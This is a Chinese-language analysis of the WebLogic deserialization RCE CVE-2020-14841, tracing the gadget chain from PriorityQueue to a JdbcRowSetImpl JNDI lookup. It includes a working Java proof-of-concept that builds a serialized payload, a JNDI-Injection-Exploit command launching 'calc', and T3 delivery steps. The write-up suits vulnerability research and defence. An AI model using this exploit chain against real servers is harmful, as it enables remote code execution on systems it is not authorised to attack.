# Weblogic 反序列化RCE漏洞分析(CVE-2020-14841) 

## CVE-2020-14841
### 靶场搭建

#### 本地搭建

下载地址：
https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html

- weblogic 10.3.6.0
- weblogic 12.1.3.0
- weblogic 12.2.1.3
- weblogic 12.2.1.4

#### docker搭建

```yaml
version: '2'
services:
 weblogic:
   image: vulhub/weblogic:12.2.1.3-2018
   ports:
    - "7001:7001"
```

### 漏洞分析

这是我第一次较深入的分析JAVA反序列化，所以从利用链最底部开始，"逆向"分析，难度较小一些。

阅读时建议先看文末payload，结合文章理解为何这么构造payload。

#### JdbcRowSetImpl

JAVA处理数据库连接时，引入了JNDI规范，目的是为了降低数据库连接的耦合性。比如当数据库配置变更时，不需要通过重启数据库的方式使配置生效。

RMI（Remote Method Invocation）远程方法调用，是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。

JdbcRowSetImpl使用支持JDBC技术的驱动程序持续维护与数据库的连接。RowSet默认是可滚动、可更新、可序列化的结果集，可以作为JavaBean来方便地在网络上传输，用于同步两端数据。

JdbcRowSetImpl中有一个connect方法，当没有已建立的连接时，调用var1.lookup(this.getDataSourceName())建立连接。

```java
private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
```

如果this.getDataSourceName()变量可控时，我们就能通过加载远程恶意类实现JNDI注入。

```java
public void setDataSourceName(String var1) throws SQLException {
    if (this.getDataSourceName() != null) {
        if (!this.getDataSourceName().equals(var1)) {
            super.setDataSourceName(var1);
            this.conn = null;
            this.ps = null;
            this.rs = null;
        }
    } else {
        super.setDataSourceName(var1);
    }
}
```

通过反序列化，我们可以轻易控制传入setDataSourceName的var1的值，因此我们需要找到一个可以调用JdbcRowSetImpl内部方法的地方

#### PriorityQueue

PriorityQueue - 优先级队列

由类名可以看出：既然有优先级，就需要进行比较-排序。既然需要比较，队列中的对象(size)就不能少于两个。

```java
//java.util.PriorityQueue
//readObject() -> heapify() -> siftDown(i, (E)queue[i]) -> siftDownUsingComparator(k, x) -> comparator.compare(x, (E)c)

private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}

private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}

private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}

private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```

该漏洞payload使用了ExtractorComparator这个comparator(比较器)(ExtractorComparator内部有compare方法)，PriorityQueue实例化时将传入的比较器赋值给this.comparator。

读取对象之后，调用heapify()对堆进行调整，一系列操作后，siftDownUsingComparator方法调用了比较器的compare方法，即ExtractorComparator.compare

```java
//com.tangosol.util.comparator.ExtractorComparator#compare

public int compare(T o1, T o2) {
    Comparable a1 = o1 instanceof Entry ? (Comparable)((Entry)o1).extract(this.m_extractor) : (Comparable)this.m_extractor.extract(o1);
    Comparable a2 = o2 instanceof Entry ? (Comparable)((Entry)o2).extract(this.m_extractor) : (Comparable)this.m_extractor.extract(o2);
    if (a1 == null) {
        return a2 == null ? 0 : -1;
    } else {
        return a2 == null ? 1 : a1.compareTo(a2);
    }
}
```

其中 o1是queue[0]的值——JdbcRowSetImpl，o2也是JdbcRowSetImpl

m_extractor实例化时会自动赋值，我们将LockVersionExtractor对象赋给m_extractor，因此这里实际上是LockVersionExtractor.extract(JdbcRowSetImpl对象)

```java
//com.tangosol.util.comparator.ExtractorComparator#compare

public <E extends Comparable<? super E>> ExtractorComparator(ValueExtractor<? super T, ? extends E> extractor) {
    Base.azzert(extractor != null);
    this.m_extractor = (ValueExtractor)Lambdas.ensureRemotable(extractor);
}
```

#### LockVersionExtractor

LockVersionExtractor.extract代码：

```java
//oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor

public Object extract(Object arg0) {
    if (arg0 == null) {
        return null;
    } else {
        if (arg0 instanceof Wrapper) {
            arg0 = ((Wrapper)arg0).unwrap();
        }

        if (!this.accessor.isInitialized()) {
            this.accessor.initializeAttributes(arg0.getClass());
        }
        //此处只能传入对象，只能执行无参函数，因此选用JNDI注入利用链
        return this.accessor.getAttributeValueFromObject(arg0);
    }
}
```

this.accessor在LockVersionExtractor实例化时赋值

```java
//oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor

public LockVersionExtractor(AttributeAccessor accessor, String className) {
    this.accessor = accessor;
    this.className = className;
}
```

找一个有getAttributeValueFromObject且能调用JdbcRowSetImpl里方法的accessor，这里选择了org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor。下一小节分析为什么选择它。


#### MethodAttributeAccessor

LockVersionExtractor.extract(JdbcRowSetImpl对象) -> MethodAttributeAccessor.getAttributeValueFromObject(JdbcRowSetImpl对象)

```java
//org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor#MethodAttributeAccessor

protected Object getAttributeValueFromObject(Object anObject, Object[] parameters) throws DescriptorException {
    try {
        if (PrivilegedAccessHelper.shouldUsePrivilegedAccess()) {
            try {
                return AccessController.doPrivileged(new PrivilegedMethodInvoker(this.getGetMethod(), anObject, parameters));
            } catch (PrivilegedActionException var5) {
                Exception throwableException = var5.getException();
                if (throwableException instanceof IllegalAccessException) {
                    throw DescriptorException.illegalAccessWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException);
                } else {
                    throw DescriptorException.targetInvocationWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException);
                }
            }
        } else {
            return this.getMethod.invoke(anObject, parameters);
        }
    } catch (IllegalArgumentException var6) {
        throw DescriptorException.illegalArgumentWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), var6);
    } catch (IllegalAccessException var7) {
        throw DescriptorException.illegalAccessWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), var7);
    } catch (InvocationTargetException var8) {
        throw DescriptorException.targetInvocationWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), var8);
    } catch (NullPointerException var9) {
        throw DescriptorException.nullPointerWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), var9);
    }
}

```

return this.getMethod.invoke(anObject, parameters);

因为需要调用到JdbcRowSetImpl中的getDatabaseMetaData方法去触发connect()，所以getMethod的值必须是getDatabaseMetaData。

```java
//com.sun.rowset.JdbcRowSetImpl

public DatabaseMetaData getDatabaseMetaData() throws SQLException {
    Connection var1 = this.connect();
    return var1.getMetaData();
}
```

getMethod修饰符为protected，无法在反序列化时直接赋值，所以得通过初始化控制getMethod。

```java
//org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor

public class MethodAttributeAccessor extends AttributeAccessor {
    protected String setMethodName = "";
    protected String getMethodName;
    protected transient Method setMethod;
    protected transient Method getMethod;
```

在上一小节的代码

```java
//oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor

if (!this.accessor.isInitialized()) {
    this.accessor.initializeAttributes(arg0.getClass());
}
```

判断条件this.accessor.isInitialized()

```java
//org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor

public boolean isInitialized() {
    return (this.getMethod != null || this.isReadOnly()) && (this.setMethod != null || this.isWriteOnly());
}
```

调用MethodAttributeAccessor.initializeAttributes

```java
//org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor

protected void initializeAttributes(Class theJavaClass, Class[] getParameterTypes) throws DescriptorException {
    //通过此处判断需要让attributeName的值不为空
    if (this.getAttributeName() == null) {
        throw DescriptorException.attributeNameNotSpecified();
    } else {
        DescriptorException descriptorException;
        try {
        	//将getMethodName的值(方法)赋给getMethod，见下图
            this.setGetMethod(Helper.getDeclaredMethod(theJavaClass, this.getGetMethodName(), getParameterTypes));
            //isWriteOnly需设置为true，因为getSetMethodName返回结果为空，找不到JdbcRowSetImpl中存在名字为空的方法会直接报错退出
            if (!this.isWriteOnly()) {
                this.setSetMethod(Helper.getDeclaredMethod(theJavaClass, this.getSetMethodName(), this.getSetMethodParameterTypes()));
            }
```

![avatar](../../../../images/java/weblogic/CVE-2020-14841/1.png)

MethodAttributeAccessor有initializeAttributes方法，能够反射调用其他类的方法，且getMethod可控，这就是选择MethodAttributeAccessor的原因。

#### 利用链

![avatar](../../../../images/java/weblogic/CVE-2020-14841/4.png)

#### payload

生成的payload.ser通过T3协议发送

```java
public class CVE_2020_14841 {
    public static void main(String[] args) throws Exception {

        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/vtyblg");

        MethodAttributeAccessor maa = new MethodAttributeAccessor();
        maa.setGetMethodName("getDatabaseMetaData");
        maa.setAttributeName("cve_2020_14841");
        maa.setIsWriteOnly(true);

        LockVersionExtractor lockverion = new LockVersionExtractor(maa, "UnicodeSec");

        final ExtractorComparator comparator = new ExtractorComparator(lockverion);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        //队列里传入两个jdbcRowSetImpl
        Object[] q = new Object[]{jdbcRowSet, jdbcRowSet};
        Reflections.setFieldValue(queue, "queue", q);
        Reflections.setFieldValue(queue, "size", 2);

        serialize(queue);
        deserialize();
    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("payload.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("payload.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

### 漏洞修复

1. 禁用T3、IIOP协议

2. 通过Oracle官网获取并安装最新补丁

### 漏洞利用

```
java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc"
```

启动ldap服务器

生成序列化payload.ser

通过T3协议发送payload.ser

![avatar](../../../../images/java/weblogic/CVE-2020-14841/2.png)

### PSF案例

![avatar](../../../../images/java/weblogic/CVE-2020-14841/3.png)
